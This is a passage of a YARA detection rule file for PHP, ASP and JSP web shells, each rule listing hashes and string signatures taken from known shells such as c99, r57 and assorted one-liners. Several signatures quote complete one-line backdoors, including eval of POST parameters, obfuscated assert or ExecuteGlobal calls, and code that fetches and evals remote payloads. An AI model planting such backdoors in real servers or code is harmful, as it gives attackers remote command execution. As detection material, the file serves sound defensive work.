      date = "2014-03-29 12:12:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "3ca5886cd54d495dc95793579611f59a"
      hash2 = "9c5bb5e3a46ec28039e8986324e42792"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<b>Dumped! Dump has been writed to " 
      $s1 = "if ((!empty($donated_html)) and (in_array($act,$donated_act))) {echo \"<TABLE st" 
      $s2 = "<input type=submit name=actarcbuff value=\\\"Pack buffer to archive" 
   condition: 
      1 of them
}

rule Webshell_c99madshell_v2_1_RID305C : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt, c99shell_v1.0.php.php.txt, c99php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:36:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "3ca5886cd54d495dc95793579611f59a"
      hash2 = "9c5bb5e3a46ec28039e8986324e42792"
      hash3 = "d8ae5819a0a2349ec552cbcf3a62c975"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "@ini_set(\"highlight" fullword
      $s1 = "echo \"<b>Result of execution this PHP-code</b>:<br>\";" fullword
      $s2 = "{$row[] = \"<b>Owner/Group</b>\";}" fullword
   condition: 
      2 of them
}

rule Webshell_GFS_web_shell_ver_3_1_7_RID32FE : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files GFS web-shell ver 3.1.7 - PRiV8.php.txt, nshell.php.php.txt, gfs_sh.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 14:28:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "4a44d82da21438e32d4f514ab35c26b6"
      hash2 = "f618f41f7ebeb5e5076986a66593afd1"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "echo $uname.\"</font><br><b>\";" fullword
      $s3 = "while(!feof($f)) { $res.=fread($f,1024); }" fullword
      $s4 = "echo \"user=\".@get_current_user().\" uid=\".@getmyuid().\" gid=\".@getmygid()" 
   condition: 
      2 of them
}

rule Webshell_c99shell_v1_0_99_RID2FF9 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt, c99shell_v1.0.php.php.txt, SpecialShell_99.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:20:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "3ca5886cd54d495dc95793579611f59a"
      hash2 = "9c5bb5e3a46ec28039e8986324e42792"
      hash3 = "d8ae5819a0a2349ec552cbcf3a62c975"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "c99ftpbrutecheck" 
      $s1 = "$ftpquick_t = round(getmicrotime()-$ftpquick_st,4);" fullword
      $s2 = "$fqb_lenght = $nixpwdperpage;" fullword
      $s3 = "$sock = @ftp_connect($host,$port,$timeout);" fullword
   condition: 
      2 of them
}

rule Webshell_SpecialShell_99d_RID3094 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files w.php.php.txt, wacking.php.php.txt, c99shell_v1.0.php.php.txt, c99php.txt, SpecialShell_99.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:45:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "9c5bb5e3a46ec28039e8986324e42792"
      hash2 = "d8ae5819a0a2349ec552cbcf3a62c975"
      hash3 = "9e9ae0332ada9c3797d6cee92c2ede62"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "$sqlquicklaunch[] = array(\"" 
      $s1 = "else {echo \"<center><b>File does not exists (\".htmlspecialchars($d.$f).\")!<" 
   condition: 
      all of them
}

rule Webshell_Fatalshell_php_RID304D : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files antichat.php.php.txt, Fatalshell.php.php.txt, a_gedit.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:34:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "b15583f4eaad10a25ef53ab451a4a26d"
      hash2 = "ab9c6b24ca15f4a1b7086cad78ff0f78"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "if(@$_POST['save'])writef($file,$_POST['data']);" fullword
      $s1 = "if($action==\"phpeval\"){" fullword
      $s2 = "$uploadfile = $dirupload.\"/\".$_POST['filename'];" fullword
      $s3 = "$dir=getcwd().\"/\";" fullword
   condition: 
      2 of them
}

rule Webshell_c99shell_v1_0_SsEs_RID3105 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files c99shell_v1.0.php.php.txt, c99php.txt, SsEs.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:04:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "9e9ae0332ada9c3797d6cee92c2ede62"
      hash2 = "6cd50a14ea0da0df6a246a60c8f6f9c9"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "if (!empty($delerr)) {echo \"<b>Deleting with errors:</b><br>\".$delerr;}" fullword
   condition: 
      1 of them
}

rule Webshell_Crystal_php_nshell_RID3214 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files Crystal.php.txt, nshell.php.php.txt, load_shell.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:49:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "4a44d82da21438e32d4f514ab35c26b6"
      hash2 = "0c5d227f4aa76785e4760cdcff78a661"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "if ($filename != \".\" and $filename != \"..\"){" fullword
      $s1 = "$dires = $dires . $directory;" fullword
      $s4 = "$arr = array_merge($arr, glob(\"*\"));" fullword
   condition: 
      2 of them
}

rule Webshell_nst_php_cybershell_RID322E : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files nst.php.php.txt, cybershell.php.php.txt, img.php.php.txt, nstview.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:54:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "ef8828e0bc0641a655de3932199c0527"
      hash2 = "17a07bb84e137b8aa60f87cd6bfab748"
      hash3 = "4745d510fed4378e4b1730f56f25e569"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "@$rto=$_POST['rto'];" fullword
      $s2 = "SCROLLBAR-TRACK-COLOR: #91AAFF" fullword
      $s3 = "$to1=str_replace(\"//\",\"/\",$to1);" fullword
   condition: 
      2 of them
}

rule Webshell_c99_generic2_RID2EE9 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated "
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:34:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "3ca5886cd54d495dc95793579611f59a"
      hash2 = "9c5bb5e3a46ec28039e8986324e42792"
      hash3 = "433706fdc539238803fd47c4394b5109"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = " if ($mode & 0x200) {$world[\"execute\"] = ($world[\"execute\"] == \"x\")?\"t\":" 
      $s1 = " $group[\"execute\"] = ($mode & 00010)?\"x\":\"-\";" fullword
   condition: 
      all of them
}

rule Webshell_c99shell_v1_PHP_RID2FE0 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files c99shell_v1.0.php.php.txt, c99php.txt, 1.txt, c2007.php.php.txt, c100.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:15:51"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "9e9ae0332ada9c3797d6cee92c2ede62"
      hash2 = "44542e5c3e9790815c49d5f9beffbbf2"
      hash3 = "d089e7168373a0634e1ac18c0ee00085"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "$result = mysql_query(\"SHOW PROCESSLIST\", $sql_sock); " fullword
   condition: 
      all of them
}

rule Webshell_multiple_php_webshells_2_RID3472 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated "
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 15:30:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "3ca5886cd54d495dc95793579611f59a"
      hash2 = "9c5bb5e3a46ec28039e8986324e42792"
      hash3 = "d8ae5819a0a2349ec552cbcf3a62c975"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "elseif (!empty($ft)) {echo \"<center><b>Manually selected type is incorrect. I" 
      $s1 = "else {echo \"<center><b>Unknown extension (\".$ext.\"), please, select type ma" 
      $s3 = "$s = \"!^(\".implode(\"|\",$tmp).\")$!i\";" fullword
   condition: 
      all of them
}

rule Webshell_SpecialShell_99_php_php_a_RID343E : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt, 1.txt, SpecialShell_99.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 15:22:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "3ca5886cd54d495dc95793579611f59a"
      hash2 = "9c5bb5e3a46ec28039e8986324e42792"
      hash3 = "44542e5c3e9790815c49d5f9beffbbf2"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "if ($total === FALSE) {$total = 0;}" fullword
      $s1 = "$free_percent = round(100/($total/$free),2);" fullword
      $s2 = "if (!$bool) {$bool = is_dir($letter.\":\\\\\");}" fullword
      $s3 = "$bool = $isdiskette = in_array($letter,$safemode_diskettes);" fullword
   condition: 
      2 of them
}

rule Webshell_r577_php_spy_2_RID2FAE : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files r577.php.php.txt, r57.php.php.txt, spy.php.php.txt, s.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:07:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "eddf7a8fde1e50a7f2a817ef7cece24f"
      hash2 = "eed14de3907c9aa2550d95550d1a2d5f"
      hash3 = "817671e1bdc85e04cc3440bbd9288800"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "$res = mssql_query(\"select * from r57_temp_table\",$db);" fullword
      $s2 = "'eng_text30'=>'Cat file'," fullword
      $s3 = "@mssql_query(\"drop table r57_temp_table\",$db);" fullword
   condition: 
      1 of them
}

rule Webshell_c99php_NIX_REMOTE_WEB_SHELL_RID3350 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files nixrem.php.php.txt, c99shell_v1.0.php.php.txt, c99php.txt, NIX REMOTE WEB-SHELL v.0.5 alpha Lite Public Version.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 14:42:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "d8ae5819a0a2349ec552cbcf3a62c975"
      hash2 = "9e9ae0332ada9c3797d6cee92c2ede62"
      hash3 = "f3ca29b7999643507081caab926e2e74"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "$num = $nixpasswd + $nixpwdperpage;" fullword
      $s1 = "$ret = posix_kill($pid,$sig);" fullword
      $s2 = "if ($uid) {echo join(\":\",$uid).\"<br>\";}" fullword
      $s3 = "$i = $nixpasswd;" fullword
   condition: 
      2 of them
}

rule Webshell_webshells_new_con2_RID31E9 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Web shells - generated from file con2.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 13:42:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s7 = ",htaPrewoP(ecalper=htaPrewoP:fI dnE:0=KOtidE:1 - eulaVtni = eulaVtni:nehT 1 => e" 
      $s10 = "j \"<Form action='\"&URL&\"?Action2=Post' method='post' name='EditForm'><input n" 
   condition: 
      1 of them
}

rule Webshell_webshells_new_make2_RID3247 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Web shells - generated from file make2.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 13:58:21"
      score = 50
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "error_reporting(0);session_start();header(\"Content-type:text/html;charset=utf-8" 
   condition: 
      all of them
}

rule Webshell_webshells_new_php2_RID31F1 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Web shells - generated from file php2.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 13:44:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<?php $s=@$_GET[2];if(md5($s.$s)==" 
   condition: 
      all of them
}

rule Webshell_bypass_iisuser_p_RID316A : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Web shells - generated from file bypass-iisuser-p.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 13:21:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<%Eval(Request(chr(112))):Set fso=CreateObject" 
   condition: 
      all of them
}

rule Webshell_webshells_new_pppp_RID3237 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Web shells - generated from file pppp.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 13:55:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Mail: chinese@hackermail.com" fullword
      $s3 = "if($_GET[\"hackers\"]==\"2b\"){if ($_SERVER['REQUEST_METHOD'] == 'POST') { echo " 
      $s6 = "Site: http://blog.weili.me" fullword
   condition: 
      1 of them
}

rule Webshell_webshells_new_jspyyy_RID332F : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Web shells - generated from file jspyyy.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 14:37:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<%@page import=\"java.io.*\"%><%if(request.getParameter(\"f\")" 
   condition: 
      all of them
}

rule Webshell_webshells_new_xxxx_RID3257 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Web shells - generated from file xxxx.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 14:01:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<?php eval($_POST[1]);?>  " fullword
   condition: 
      all of them
}

rule Webshell_webshells_new_JJjsp3_RID328B : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Web shells - generated from file JJjsp3.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 14:09:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<%@page import=\"java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*\"%><%!S" 
   condition: 
      all of them
}

rule Webshell_webshells_new_radhat_RID32EB : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Web shells - generated from file radhat.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 14:25:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "sod=Array(\"D\",\"7\",\"S" 
   condition: 
      all of them
}

rule Webshell_webshells_new_asp1_RID31EC : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Web shells - generated from file asp1.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 13:43:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = " http://www.baidu.com/fuck.asp?a=)0(tseuqer%20lave " fullword
      $s2 = " <% a=request(chr(97)) ExecuteGlobal(StrReverse(a)) %>" fullword
   condition: 
      1 of them
}

rule Webshell_webshells_new_php6_RID31F5 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Web shells - generated from file php6.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 13:44:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "array_map(\"asx73ert\",(ar" 
      $s3 = "preg_replace(\"/[errorpage]/e\",$page,\"saft\");" fullword
      $s4 = "shell.php?qid=zxexp  " fullword
   condition: 
      1 of them
}

rule Webshell_webshells_new_xxx_RID31DF : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Web shells - generated from file xxx.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 13:41:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "<?php array_map(\"ass\\x65rt\",(array)$_REQUEST['expdoor']);?>" fullword
   condition: 
      all of them
}

rule Webshell_GetPostpHp_RID2E94 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Web shells - generated from file GetPostpHp.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 11:20:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<?php eval(str_rot13('riny($_CBFG[cntr]);'));?>" fullword
   condition: 
      all of them
}

rule Webshell_webshells_new_php5_RID31F4 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Web shells - generated from file php5.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 13:44:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<?$_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_u" 
   condition: 
      all of them
}

rule Webshell_webshells_new_aaa_RID319A : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Web shells - generated from file aaa.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 13:29:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Function fvm(jwv):If jwv=\"\"Then:fvm=jwv:Exit Function:End If:Dim tt,sru:tt=\"" 
      $s5 = "<option value=\"\"DROP TABLE [jnc];exec mast\"&kvp&\"er..xp_regwrite 'HKEY_LOCAL" 
      $s17 = "if qpv=\"\" then qpv=\"x:\\Program Files\\MySQL\\MySQL Server 5.0\\my.ini\"&br&" 
   condition: 
      1 of them
}

rule Webshell_Expdoor_com_ASP_RID3068 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Web shells - generated from file Expdoor.com ASP.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 12:38:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s4 = "\">www.Expdoor.com</a>" fullword
      $s5 = "    <input name=\"FileName\" type=\"text\" value=\"Asp_ver.Asp\" size=\"20\" max" 
      $s10 = "set file=fs.OpenTextFile(server.MapPath(FileName),8,True)  '" fullword
      $s14 = "set fs=server.CreateObject(\"Scripting.FileSystemObject\")   '" fullword
      $s16 = "<TITLE>Expdoor.com ASP" fullword
   condition: 
      2 of them
}

rule Webshell_sig_404super_RID2F0F : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Web shells - generated from file 404super.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 11:41:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s4 = "$i = pack('c*', 0x70, 0x61, 99, 107);" fullword
      $s6 = "    'h' => $i('H*', '687474703a2f2f626c616b696e2e64756170702e636f6d2f7631')," fullword
      $s7 = "//http://require.duapp.com/session.php" fullword
      $s8 = "if(!isset($_SESSION['t'])){$_SESSION['t'] = $GLOBALS['f']($GLOBALS['h']);}" fullword
      $s12 = "//define('pass','123456');" fullword
      $s13 = "$GLOBALS['c']($GLOBALS['e'](null, $GLOBALS['s']('%s',$GLOBALS['p']('H*',$_SESSIO" 
   condition: 
      1 of them
}

rule Webshell_webshells_new_JSP_RID3164 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Web shells - generated from file JSP.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 13:20:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "void AA(StringBuffer sb)throws Exception{File r[]=File.listRoots();for(int i=0;i" 
      $s5 = "bw.write(z2);bw.close();sb.append(\"1\");}else if(Z.equals(\"E\")){EE(z1);sb.app" 
      $s11 = "if(Z.equals(\"A\")){String s=new File(application.getRealPath(request.getRequest" 
   condition: 
      1 of them
}

rule Webshell_dev_core_RID2DED : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Web shells - generated from file dev_core.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 10:52:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "if (strpos($_SERVER['HTTP_USER_AGENT'], 'EBSD') == false) {" fullword
      $s9 = "setcookie('key', $_POST['pwd'], time() + 3600 * 24 * 30);" fullword
      $s10 = "$_SESSION['code'] = _REQUEST(sprintf(\"%s?%s\",pack(\"H*\",'6874" 
      $s11 = "if (preg_match(\"/^HTTP\\/\\d\\.\\d\\s([\\d]+)\\s.*$/\", $status, $matches))" 
      $s12 = "eval(gzuncompress(gzuncompress(Crypt::decrypt($_SESSION['code'], $_C" 
      $s15 = "if (($fsock = fsockopen($url2['host'], 80, $errno, $errstr, $fsock_timeout))" 
   condition: 
      1 of them
}

rule Webshell_webshells_new_pHp_RID319F : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Web shells - generated from file pHp.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 13:30:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "if(is_readable($path)) antivirus($path.'/',$exs,$matches);" fullword
      $s1 = "'/(eval|assert|include|require|include\\_once|require\\_once|array\\_map|arr" 
      $s13 = "'/(exec|shell\\_exec|system|passthru)+\\s*\\(\\s*\\$\\_(\\w+)\\[(.*)\\]\\s*" 
      $s14 = "'/(include|require|include\\_once|require\\_once)+\\s*\\(\\s*[\\'|\\\"](\\w+" 
      $s19 = "'/\\$\\_(\\w+)(.*)(eval|assert|include|require|include\\_once|require\\_once" 
   condition: 
      1 of them
}

rule Webshell_webshells_new_code_RID3212 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Web shells - generated from file code.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 13:49:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<a class=\"high2\" href=\"javascript:;;;\" name=\"action=show&dir=$_ipage_fi" 
      $s7 = "$file = !empty($_POST[\"dir\"]) ? urldecode(self::convert_to_utf8(rtrim($_PO" 
      $s10 = "if (true==@move_uploaded_file($_FILES['userfile']['tmp_name'],self::convert_" 
      $s14 = "Processed in <span id=\"runtime\"></span> second(s) {gzip} usage:" 
      $s17 = "<a href=\"javascript:;;;\" name=\"{return_link}\" onclick=\"fileperm" 
   condition: 
      1 of them
}

rule Webshell_webshells_new_PHP1_RID3190 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Web shells - generated from file PHP1.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 13:27:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<[url=mailto:?@array_map($_GET[]?@array_map($_GET['f'],$_GET[/url]);?>" fullword
      $s2 = ":https://forum.90sec.org/forum.php?mod=viewthread&tid=7316" fullword
      $s3 = "@preg_replace(\"/f/e\",$_GET['u'],\"fengjiao\"); " fullword
   condition: 
      1 of them
}

rule Webshell_webshells_new_JJJsp2_RID326A : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Web shells - generated from file JJJsp2.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 14:04:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "QQ(cs, z1, z2, sb,z2.indexOf(\"-to:\")!=-1?z2.substring(z2.indexOf(\"-to:\")+4,z" 
      $s8 = "sb.append(l[i].getName() + \"/\\t\" + sT + \"\\t\" + l[i].length()+ \"\\t\" + sQ" 
      $s10 = "ResultSet r = s.indexOf(\"jdbc:oracle\")!=-1?c.getMetaData()" 
      $s11 = "return DriverManager.getConnection(x[1].trim()+\":\"+x[4],x[2].equalsIgnoreCase(" 
   condition: 
      1 of them
}

rule Webshell_webshells_new_PHP_RID315F : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Web shells - generated from file PHP.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 13:19:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "echo \"<font color=blue>Error!</font>\";" fullword
      $s2 = "<input type=\"text\" size=61 name=\"f\" value='<?php echo $_SERVER[\"SCRIPT_FILE" 
      $s5 = " - ExpDoor.com</title>" fullword
      $s10 = "$f=fopen($_POST[\"f\"],\"w\");" fullword
      $s12 = "<textarea name=\"c\" cols=60 rows=15></textarea><br>" fullword
   condition: 
      1 of them
}

rule Webshell_webshells_new_Asp_RID319B : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Web shells - generated from file Asp.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 13:29:41"
      score = 70
      customer = "demo"
